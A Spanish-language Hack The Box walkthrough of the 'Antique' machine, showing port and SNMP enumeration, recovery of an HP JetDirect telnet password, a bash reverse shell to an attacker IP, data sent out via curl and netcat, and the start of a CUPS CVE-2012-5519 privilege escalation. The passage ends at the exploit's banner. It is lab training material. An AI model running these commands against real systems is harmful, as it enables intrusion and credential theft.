---
title: "Antique - Hack The Box"
date: 2023-05-17
draft: false
slug: "htb-writeup-antique"
excerpt: "Esta fue una máquina bastante interesante, haciendo los escaneos correspondientes, únicamente, encontramos un puerto abierto que corre el servicio Telnet, al no encontrar nada más, buscamos por UDP y encontramos el puerto 161 donde corre el servicio SNMP. De ahí, encontramos la contraseña para acceder a Telnet y abusando de los privilegios, obtenemos una shell de forma remota. Para escalar privilegios, utilizamos el privilegio lpadmin y el CVE-2012-5519 para explotarlo y obtener la flag del Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Telnet", "UDP Scan", "SNMP Enumeration", "Abusing Telnet Privileges", "CUPS", "CUPS Administration Exploit", "Privesc - CVE-2012-5519 (CUPS Administration Exploit)", "Dirty Pipe Exploitation", "Privesc - CVE-2022-0847 (Dirty Pipe)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "telnet"
  - "snmpwalk"
  - "echo"
  - "xargs"
  - "xxd"
  - "nc"
  - "bash"
  - "python"
  - "python3"
  - "id"
  - "find"
  - "netstat"
  - "which"
  - "curl"
  - "html2text"
  - "wget"
  - "chmod"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/handler"
  - "Módulo: multi/escalate/cups_root_file_read"
  - "cupsctl"
  - "chisel"
  - "gunzip"
  - "uname"
  - "searchsploit"
  - "gcc"
links:
  - "https://nmap.org/book/scan-methods-udp-scan.html"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp"
  - "https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/"
  - "https://github.com/p1ckzi/CVE-2012-5519"
  - "https://blog.invgate.com/es/snmpwalk"
  - "https://tecnocratica.net/wikicratica/books/monitorizacion-y-snmp/page/snmp-mibs-y-oid"
  - "https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/"
  - "https://en.wikipedia.org/wiki/Object_identifier"
  - "https://www.irongeek.com/i.php?page=security/networkprinterhacking"
  - "https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read"
  - "https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp"
  - "https://github.com/jpillora/chisel/releases/tag/v1.10.0"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-antique/antique_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.107
PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=144 ms
64 bytes from 10.10.11.107: icmp_seq=2 ttl=63 time=142 ms
64 bytes from 10.10.11.107: icmp_seq=3 ttl=63 time=142 ms
64 bytes from 10.10.11.107: icmp_seq=4 ttl=63 time=141 ms

--- 10.10.11.107 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 141.338/142.254/144.018/1.049 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:19 CST
Initiating SYN Stealth Scan at 13:19
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 13:19, 27.66s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (1.6s latency).
Scanned at 2023-05-17 13:19:14 CST for 28s
Not shown: 55477 filtered tcp ports (no-response), 10057 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.89 seconds
           Raw packets sent: 126562 (5.569MB) | Rcvd: 10125 (405.020KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

A canijo, nada más hay un puerto abierto y el servicio **Telnet**, no recuerdo haberlo explotado antes. Veamos que nos dice el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p23 10.10.11.107 -oN targeted                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:20 CST
Nmap scan report for 10.10.11.107
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?

| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.93%I=7%D=5/17%Time=646528FF%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.27 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tardo bastante en hacer el escaneo y no veo algo que nos sea útil, por lo que vamos a analizar el servicio **Telnet**.

### Analizando Servicio Telnet {#Telnet}

Entremos al servicio:
```bash
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.

HP JetDirect

Password:
```
Pues no tenemos una contraseña, pero nos menciona algo, busquemos que es **HP JetDirect**:

| **HP JetDirect** |
|:-----------:|
| *Los servidores de impresión HP JetDirect le permiten conectar impresoras y otros dispositivos directamente a una red. Conectados directamente a la red, los dispositivos pueden ubicarse cómodamente cerca de los usuarios.* |

Presiento que esto va a ser un poco difícil, porque no tenemos ni contraseña y es el único puerto abierto que encontramos en **TCP**, es momento de buscar si hay algún puerto abierto en **UDP**.

### Escaneo de Puertos UDP {#UDP}

Esta clase de escaneos puede ser demasiado tardada, pues puede durar hasta más de 1 hora, por lo que vamos a utilizar distintos parámetros con tal de reducir el tiempo lo más que se pueda:
```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107 -oN udpScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:52 CST
Initiating Ping Scan at 13:52
Scanning 10.10.11.107 [4 ports]
Completed Ping Scan at 13:52, 0.16s elapsed (1 total hosts)
Initiating UDP Scan at 13:52
Scanning 10.10.11.107 [100 ports]
Warning: 10.10.11.107 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.107
Completed UDP Scan at 13:53, 10.18s elapsed (100 total ports)
Nmap scan report for 10.10.11.107
Host is up (0.14s latency).
Not shown: 83 open|filtered udp ports (no-response), 16 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
           Raw packets sent: 323 (18.717KB) | Rcvd: 18 (1.531KB)
```

| Parámetros    | Descripción |
|---|---|
| *-sU*         | Para indicar un escaneo por UDP. |
| *--top-ports* | Para indicar que se escaneen los puertos más comunes. |
| *--open*      | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-T#*         | Para controlar el temporizado y rendimiento para ir lo más rápido posible, tiene un rango de 1 a 5 (este es útil solo en ambientes controlados, pues a mayor rango, mayor el riesgo de ser descubiertos). |
| *-v*          | Un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*          | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-oN*         | Para indicar que el output se guarde en un fichero. Lo llamé udpScan. |

Aquí información que nos comparte NMAP sobre esta clase de escaneos:
* <a href="https://nmap.org/book/scan-methods-udp-scan.html" target="_blank">UDP Scan (-sU)</a>

Y nos muestra un puerto abierto, que es del servicio **SNMP**, busquemos información sobre este servicio:

| **Protocolo SNMP** |
|:-----------:|
| *El Protocolo simple de administración de red o SNMP (del inglés Simple Network Management Protocol) es un protocolo de la capa de aplicación que facilita el intercambio de información de administración entre dispositivos de red.* |

Excelente, ya sabemos por donde comenzaremos a vulnerar la máquina. 

## Análisis de Vulnerabilidades {#Analisis}

### Utilizando Herramienta snmpwalk {#SNMP}

De acuerdo al blog que vimos, vamos a utilizar la herramienta **snmpwalk**.

| **Protocolo SNMP** |
|:-----------:|
| *Un SNMPwalk es una aplicación utilizada para obtener una lista completa de los datos de los dispositivos disponibles en una red. La aplicación envía un conjunto repetido de comandos SNMP a los agentes de una red que, a su vez, devolverán los parámetros de los dispositivos disponibles y sus valores.* |

En resumen, esta herramienta nos sirve para enumerar el **servicio SNMP**, aunque puede no funcionar. Te dejo más información en el siguiente link:
* <a href="https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-snmp" target="_blank">HackTricks: 161,162,10161,10162/udp - Pentesting SNMP</a>
* <a href="https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/" target="_blank">Tutorial de SNMP: ¿cómo funcionan snmpwalk y snmpget?</a>

Con la herramienta **snmpwalk** no se solicita tan solo un registro de datos concreto del **dispositivo SNMP**, sino también registros de datos que le sigan (útil en el caso de tablas, por ejemplo).

Utilizaremos los ejemplos que vienen en la página, pero nos pide el parámetro **OID**, primero entendamos bien que es un **OID**:

| **Identificadores de Objetos (OID)** |
|:-----------:|
| *En informática, los identificadores de objetos u OID son un mecanismo de identificación estandarizado por la Unión Internacional de Telecomunicaciones e ISO/IEC para nombrar cualquier objeto, concepto o "cosa" con un nombre persistente globalmente inequívoco.* |

Ahora veamos lo que nos dice la herramienta sobre este parámetro:

| **Funcionamiento de OID en snmpwalk** |
|:-----------:|
| *Se puede proporcionar un identificador de objeto (OID) en la línea de comando. Este OID especifica qué parte del espacio del identificador de objeto se buscará mediante solicitudes GETNEXT. Se consultan todas las variables en el subárbol debajo del OID dado y se presentan sus valores al usuario. Cada nombre de variable se da en el formato especificado en variables(5). Si no hay un argumento OID presente, snmpwalk buscará el subárbol enraizado en SNMPv2-SMI::mib-2 (incluidos los valores de objetos MIB de otros módulos MIB, que se definen como pertenecientes a este subárbol). Si la entidad de la red tiene un error al procesar el paquete de solicitud, se devolverá un paquete de error y se mostrará un mensaje que ayudará a identificar por qué la solicitud se formó incorrectamente. Si la búsqueda en árbol provoca intentos de búsqueda más allá del final de la MIB, se mostrará el mensaje "Fin de la MIB".* |

Además para que funcione la herramienta, necesitamos consultar los **OIDs** almacenados en un **MIB** (que por defecto **snmpwalk** usa el módulo **SNMPv2-SMI::mib-2** que consulta **OIDs** especificos del **MIB-2**).

Entendamos bien que es un **MIB**:

| **Management Information Base (MIB)** |
|:-----------:|
| *Para asegurar que el acceso SNMP funcione entre diferentes fabricantes y con diferentes combinaciones de cliente-servidor, se creó la Base de Información de Gestión (MIB). MIB es un formato independiente para almacenar información del dispositivo. Un MIB es un archivo de texto en el que se enumeran todos los objetos SNMP consultables de un dispositivo en una jerarquía de árbol estandarizada. Contiene al menos un OID, que, además de la dirección única necesaria y un nombre, también proporciona información sobre el tipo, derechos de acceso y una descripción del respectivo objeto.* |

En resumen de todo esto, para que funcione la herramienta **snmpwalk**, necesitamos usar la versión que se este utilizando del **SNMP**, un community string (que normalmente se usa **Public**), la IP del objetivo y por último los **OIDs** a consultar.

Los **OIDs** los puedes sacar del **arból OID** que viene en la página de **HackTricks**, por lo que entiendo, se pueden usar los **OID** de ciertos módulos (como el módulo **SNMPv2-SMI::mib-2**), aunque es mejor indicar que use la raíz de los **OID** que sería el **1 (OSI)**.

Para poder leer el resultado de una consulta de un **MIB**, necesitamos una librería que transforma los **OIDs** consultados en digamos, texto legible.

Vamos a instalarla:
```bash
apt install snmp-mibs-downloader
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
...
...
...
```

Ahora, hagamos una prueba rápida con un ejemplo que viene en la página, pero sin el **OID**:
```bash
snmpwalk -v1 -c public 10.10.11.107                               
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

Como puedes ver, los **OIDs** de **SNMP** aparecen como números (que en realidad son del **arból OID**), para cambiar eso, modificamos el archivo **/etc/snmp/snmp.config** que se instalo de la librería y comentamos la única línea que no está comentada:
```bash
nano /etc/snmp/snmp.conf
# mibs :
```

Volvemos a probar y nos debería marcar como menciona el manual:
```bash
snmpwalk -v1 -c public 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
```
Listo. 

Ahora sí, vamos a utilizar cualquier ejemplo de la herramienta que nos muestran en la página web, pero con un **OID** que sería el **1** para ir desde la raíz:
```bash
snmpwalk -v1 -c public 10.10.11.107 1
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
Si intentas con otro número que no sea 1, saldrá error.

En la siguiente página, nos indican que tenemos **OIDs** que pueden mostrar directamente la contraseña de **JetDirect**:
* <a href="https://www.irongeek.com/i.php?page=security/networkprinterhacking" target="_blank">Hacking Network Printers (Mostly HP JetDirects, but a little info on the Ricoh Savins)</a>

Vamos a intentarlo:
```bash
snmpwalk -v1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
Excelente, si funciono.

Veo que nos muestra varios números en hexadecimal, vamos a tratar de descifrar que son estos números.

### Descifrando Números Hexadecimales {#Hexa}

Lo que haremos, será convertir los números hexadecimales en binario para ver si hay algún mensaje oculto.

Primero copiemos los números en nuestra máquina:
```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135"                     
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

Con **xargs**, te aparecerán más ordenados:
```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

Para convertir estos números a binario, vamos a usar la herramienta **xxd** con algunos parámetros:
```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r 
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
```
Excelente, ya tenemos algo, lo que parece ser una contraseña, pero no sé hasta qué punto sería para probarla y el único servicio en el que podemos probar, es el de **Telnet**.

Probemos:
```bash
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
Vaya, pues era todo eso. Algo curioso que nos muestra, es que podemos usar el comando **exec** para ejecutar comandos del sistema. Aprovechémonos de esto.

## Explotación de Vulnerabilidades {#Explotacion}

### Obteniendo una Shell desde Servicio Telnet {#Telnet2}

Probemos primero el comando que viene en el mensaje:
```bash
...
exec: execute system commands (exec id)
exit: quit from telnet session
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

Bien, probemos otros comandos:
```bash
> exec ls
telnet.py
user.txt
> exec ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Muy bien, ahora si, vamos a obtener esa shell, por pasos:
* Abre una **netcat**:
```bash
nc -nvlp 443                  
listening on [any] 443 ...
```

* Utiliza el siguiente comando para obtener la shell:
```bash
exec bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"
```

* Vuelve a observar la netcat y ya debería estar conectado a la máquina:
```bash
nc -nvlp 443                  
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.107] 58544
bash: cannot set terminal process group (1007): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ whoami
whoami
lp
lp@antique:~$ ls
ls
telnet.py
user.txt
lp@antique:~$ cat user.txt
cat user.txt
...
```
Excelente, ya obtuvimos la flag del usuario, es momento de buscar la forma de convertirnos en Root.

## Post Explotación {#Post}

### Obteniendo Terminal Interactiva {#Terminal}

Antes de continuar, te recomiendo conseguir una shell interactiva. Esta vez, lo voy a mostrar de forma distinta, porque si lo hacemos como siempre, nos saldrá esto:
```bash
lp@antique:~$ ls
ls
telnet.py
user.txt
lp@antique:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
This account is currently not available.
Script done, file is /dev/null
```

Entonces, vamos a hacerlo con **Python**, por pasos:
* Verifica que tenga **Python** la máquina:
```bash
lp@antique:~$ which python
which python
lp@antique:~$ which python3
which python3
/usr/bin/python3
```

* Utiliza **Python** para spawnear una shell de **Bash**:
```bash
lp@antique:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

* Oprime **ctrl + z** y escribe lo siguiente:
```bash
lp@antique:~$ ^Z
zsh: suspended  nc -nvlp 443
stty raw -echo; fg
```

* Rápidamente, escribe:
```bash
stty raw -echo; fg
[1]  + continued  nc -nvlp 443
                              reset xterm
```

* Una vez obtenida la shell, exporta la **XTERM, SHELL** y cambia la **stty**:
```bash
lp@antique:~$ export TERM=xterm
lp@antique:~$ export SHELL=bash
lp@antique:~$ stty rows 51 columns 189
```
Listo, ya tenemos la shell interactiva.

### Enumerando Máquina Víctima {#Enum}

Si nos ponemos a buscar que hay dentro de la máquina como el usuario **lp**, no encontraremos mucho a parte de la flag, pero si encontramos un script de **Python** que es el que despliega el **telnet**.

Revisando los grupos a los que pertenece el usuario, encontramos que está en el grupo **lp y lpadmin**, esto puede servirnos más adelante:
```bash
lp@antique:~$ id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

Veamos que binarios hay, quizá alguno sea vulnerable:
```bash
lp@antique:~$ cd /
lp@antique:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/authbind/helper
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
```
No veo algo que nos pueda servir de momento, sigamos investigando.

Investigando los puertos activos, encontramos que hay un puerto abierto que no es público:
```bash
lp@antique:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:631                 :::*                    LISTEN     
udp        0      0 0.0.0.0:161             0.0.0.0:*
```

No conozco ese puerto, vamos a investigarlo.

Mira lo que encontre:
* <a href="https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp" target="_blank">HackTricks: 631 - Internet Printing Protocol(IPP)</a>

Al parecer nos puede mostrar una página web, veamos si tenemos **curl** en la máquina:
```bash
lp@antique:/$ which curl
/usr/bin/curl
```

Bien, como no creo que tengamos instalado la herramienta **html2text**, vamos a mandar la respuesta del **curl** a nuestra máquina mediante una **netcat** y el resultado lo guardamos en un archivo de texto/html (cualquiera de los dos, no importa cual sea).

Hagamoslo por pasos:

* Levanta una **netcat** y pon que el resultado se guarde en un archivo:
```bash
nc -nvlp 1234 > respuesta.html
listening on [any] 1234 ...
```

* Usa **curl** para mandar una petición al **localhost** por el **puerto 631** y aplica una pipe para que el resultado vaya a nuestra **netcat**:
```bash
curl localhost:631 | nc Tu_IP 1234
```

* Cierra la **netcat** que levantaste, ya deberías tener el archivo ahí:
```bash
nc -nvlp 1234 > respuesta.html
listening on [any] 1234 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.107] 57662
^C
ls
respuesta.html
```

* Usa **html2text** para ver el resultado:
```bash
cat respuesta.html | html2text
Input recoding failed due to invalid input sequence. Unconverted part of text follows.
�  Administration�  Classes�  Online Help  Jobs�  Printers�INPUT
                                                                               type]
****** CUPS 1.6.1 ******
CUPS is the standards-based, open source printing system developed by Apple_Inc. [CUPS]
for OS® X and other UNIX®-like operating systems.
***** CUPS for Users ***** ***** CUPS for Administrators ***** CUPS for Developers
Overview_of_CUPS           *****                         *****
Command-Line_Printing_and  Adding_Printers_and_Classes   Introduction_to_CUPS
Options                    Managing_Operation_Policies   Programming
What's_New_in_CUPS_1.6     Printer_Accounting_Basics     CUPS_API
User_Forum                 Server_Security               Filter_and_Backend_Programming
                           Using_Kerberos_Authentication HTTP_and_IPP_APIs
                           Using_Network_Printers        PPD_API
                           cupsd.conf_Reference          Raster_API
                           Find_Printer_Drivers          PPD_Compiler_Driver
                                                         Information_File_Reference
                                                         Developer_Forum
 
CUPS and the CUPS logo are trademarks of Apple_Inc. CUPS is copyright 2007-2012 Apple
Inc. All rights reserved.
```

Excelente, vemos que estan ocupando el servicio **CUPS versión 1.6.1**, busquemos un Exploit.

### Buscando y Probando Exploits para CUPS 1.6.1 {#CUPS}

Encontre un Exploit que podemos usar de 2 formas, la primera es usando un módulo de **Metasploit** y la segunda es con una implementación de ese módulo, pero sin usar **Metasploit** sino un script en **Bash** que podemos descargar desde **GitHub**.

Vamos a ocupar primero el Exploit de **GitHub** y luego el de **Metasploit**.

#### Probando Exploit: cups-root-file-read.sh (CVE-2012-5519) de GitHub {#CUPS2}

Aquí lo puedes encontrar:
* <a href="https://github.com/p1ckzi/CVE-2012-5519" target="_blank">Repositorio de p1ckzi: cups-root-file-read.sh</a>

Para que el Exploit funcione, el usuario debe estar en el grupo **lpadmin**, que ya comprobamos que si lo esta.

Vamos por pasos para configurarlo y usarlo:

* Descarga el Exploit en tu máquina:
```bash
wget https://raw.githubusercontent.com/p1ckzi/CVE-2012-5519/main/cups-root-file-read.sh
--2023-05-17 16:40:30--  https://raw.githubusercontent.com/p1ckzi/CVE-2012-5519/main/cups-root-file-read.sh
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 13027 (13K) [text/plain]
Grabando a: «cups-root-file-read.sh»
cups-root-file-read.sh            100%[======================================>]  12.72K  --.-KB/s    en 0s      
2023-05-17 16:40:31 (33.2 MB/s) - «cups-root-file-read.sh» guardado [13027/13027]
```

* Abre un servidor en **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Desde la máquina víctima, vamos a descargarlo:
```bash
lp@antique:~$ wget http://Tu_IP/cups-root-file-read.sh
--2023-05-17 22:41:31--  http://Tu_IP/cups-root-file-read.sh
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13027 (13K) [text/x-sh]
Saving to: ‘cups-root-file-read.sh’
cups-root-file-read.sh   0%[                                                                 
cups-root-file-read.sh  100%[===========================================>]  12.72K  --.-KB/s    in 0.02s   
2023-05-17 22:41:31 (754 KB/s) - ‘cups-root-file-read.sh’ saved [13027/13027]
```

* Démosle permisos de ejecución:
```bash
lp@antique:~$ chmod +x cups-root-file-read.sh
```

* Ejecutalo:
```bash
lp@antique:~$ ./cups-root-file-read.sh 
  ___      __     ___     -----   _     _   
 / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____                                                                                   

| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|                                                                                  
 \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|                                                                                       
